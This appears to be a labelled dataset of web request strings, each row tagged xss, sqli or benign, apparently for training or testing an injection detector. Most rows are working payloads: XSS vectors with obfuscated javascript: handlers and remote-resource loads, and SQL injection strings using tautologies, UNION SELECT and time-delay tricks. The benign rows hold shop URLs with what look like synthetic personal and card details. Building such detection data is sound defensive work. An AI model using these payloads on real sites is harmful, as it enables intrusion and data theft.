+"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",xss
+&noo&: select * from users where id=1 or $+<\ or 1=1 -- 1,sqli
+miembros/editar.jsp?modo=registro&login=derbyshi&password=filen%3Fa&nombre=Anuar&apellidos=Cruselles+Varela&email=jane%4023horas.ua&dni=95001516Q&direccion=Muelle+Evaristo+Churruca%2C+149+5%3FE&ciudad=Friera+de+Valverde&cp=50133&provincia=Salamanca&ntc=5389852449679105&B1=Registrar,benign
+"s,UEs: select * from users where id=1 or 1#"", union select 'a',version() -- 1",sqli
+"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+1)&1c: select * from users where id=1 +(1) or 1=1 -- 1,sqli
+admin') or '1'='1'/*,sqli
+heile,benign
+"s?.s: select * from users where id=1 or ""]."" or 1=1 -- 1",sqli
+1); waitfor delay '0:0:X'--,sqli
+"s.UEf: select * from users where id=1 or 1#"". union select version(),version() -- 1",sqli
+"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
+"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
+o(1)&: select * from users where id=1 %(1) or 1=1 -- 1,sqli
+"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"456"")%5d|//a|/a%5bcontains(a,""b",sqli
+2 order by 1,sqli
+\x3Cscript>javascript:alert(1)</script>,xss
+"&o.UE: select * from users where id=1 or \<\. union select 1,@@VERSION -- 1",sqli
+"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+a' and 'fghi'='fghj'--,sqli
+"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss
+publico/productos.jsp,benign
+"s{o1U: select * from users where id=1 or @#""{=1 union select 1,version() -- 1",sqli
+ac6di9o,benign
+admin'/*,sqli
+12480,benign
+"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+noo&1: select * from users where id=1 + $+%\ or 1=1 -- 1,sqli
+"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
+"s:n: select * from users where id=1 or "":["" or 1=1 -- 1",sqli
+"""`'><script>\x0Ajavascript:alert(1)</script>",xss
+"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss
+"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>",xss
+"""`'><script>\x2Bjavascript:alert(1)</script>",xss
+publico/vaciar.jsp?B2=Vaciar+carrito,benign
+ ,sqli
+global/titulo.jsp,benign
+gussack.reinecke@eddydaniele.pt,benign
+calle gurugu 142 4?d,benign
+8470,benign
+danis,benign
+"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
+"&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1",sqli
+celfa,benign
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,sqli
+&no&1: select * from users where id=1 or $<\ or 1=1 -- 1,sqli
+admin') or '1'='1'--,sqli
+"s\c: select * from users where id=1 or ""\#"" or 1=1 -- 1",sqli
+stadler_munks@chevrolet-volt.at,benign
+"""`'><script>\x20javascript:alert(1)</script>",xss
+"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",xss
+feutlins,benign
+"s;o1&: select * from users where id=1 or @#"";=1 or 1=1 -- 1",sqli
+"s?(s: select * from users where id=1 or ""?("" or 1=1 -- 1",sqli
+"UE(1): select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1",sqli
+"s.)s: select * from users where id=1 or "".)"" or 1=1 -- 1",sqli
+"s(ns: select * from users where id=1 or ""(_"" or 1=1 -- 1",sqli
+publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=90&B1=A%F1adir+al+carrito,benign
+publico/productos.jsp,benign
+"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+-,sqli
+"sUEnn: select * from users where id='1' union select $ _,@@VERSION -- 1'",sqli
+"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
+global/menum.jsp,benign
+"""`'><script>\x09javascript:alert(1)</script>",xss
+"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss
+imagenes/cmenbul.gif,benign
+"s,UE1: select * from users where id=1 or 1#"", union select 1,version() -- 1",sqli
+global/estilos.css,benign
+"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
+leiding@ubuybetter.cat,benign
+"sUE&o: select * from users where id='1' union select ||/1,version() -- 1'",sqli
+"s(,s: select * from users where id=1 or ""(,""=1 or 1=1 -- 1",sqli
+"s..s: select * from users where id=1 or ""..""=1 or 1=1 -- 1",sqli
+"s;UE1: select * from users where id=1 or 1#""; union select 1,version() -- 1",sqli
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
+miembros/editar.jsp?modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,benign
+"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
+"sn)s: select * from users where id=1 or ""_)"" or 1=1 -- 1",sqli
+miembros/imagenes/castro.jpg,benign
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
+imagenes/logo.gif,benign
+global/estilos.css,benign
+no&1c: select * from users where id=1 +$+ or 1=1 -- 1,sqli
+" or x""=""x",sqli
+"molinos, los",benign
+imagenes/1.gif,benign
+"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
+belva,benign
+"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",xss
+"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
+admin' or '1'='1'#,sqli
+50645313a,benign
+global/titulo.jsp,benign
+"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+global/creditos.jsp,benign
+"s,UEf: select * from users where id=1 or 1#"", union select version(),version() -- 1",sqli
+"<img src=""javascript:alert(1)"">",xss
+"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
+"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>",xss
+a' or 'dfth'='dfth'#,sqli
+"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">​",xss
+<script itworksinallbrowsers>/*<script* */alert(1)</script ​,xss
+madgett,benign
+"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
+"s.UE1: select * from users where id=1 or 1#"". union select 1,version() -- 1",sqli
+')) or (('x'))=(('x,sqli
+40560,benign
+son1&: select * from users where id='1' *$ 1 or 1=1 -- 1',sqli
+"s?ns: select * from users where id=1 or ""?_"" or 1=1 -- 1",sqli
+&1oo&: select * from users where id=1 or \+<\ or 1=1 -- 1,sqli
+"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+6.27E+15,benign
+"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss
+"<video><source onerror=""javascript:javascript:alert(1)"">",xss
+"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
+"admin"") or ""1""=""1""--",sqli
+global/creditos.jsp,benign
+22390,benign
